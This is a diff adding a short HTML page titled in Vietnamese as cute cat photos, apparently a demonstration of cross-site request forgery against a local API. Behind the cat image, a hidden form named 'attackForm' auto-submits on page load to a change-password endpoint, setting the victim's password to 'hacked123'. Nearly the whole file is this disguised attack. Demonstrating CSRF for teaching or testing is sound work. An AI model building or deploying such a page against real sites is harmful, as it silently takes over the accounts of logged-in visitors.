@@ -1,0 +1,26 @@
+<body>
+
+<h1>Xem ảnh mèo siêu dễ thương</h1>
+
+<img
+    src="https://picsum.photos/400/300"
+>
+
+<form
+    action="https://localhost:5001/api/change-password"
+    method="POST"
+    id="attackForm">
+
+    <input
+        type="hidden"
+        name="password"
+        value="hacked123">
+</form>
+
+<script>
+window.onload = () => {
+    document.getElementById('attackForm').submit();
+};
+</script>
+
+</body>
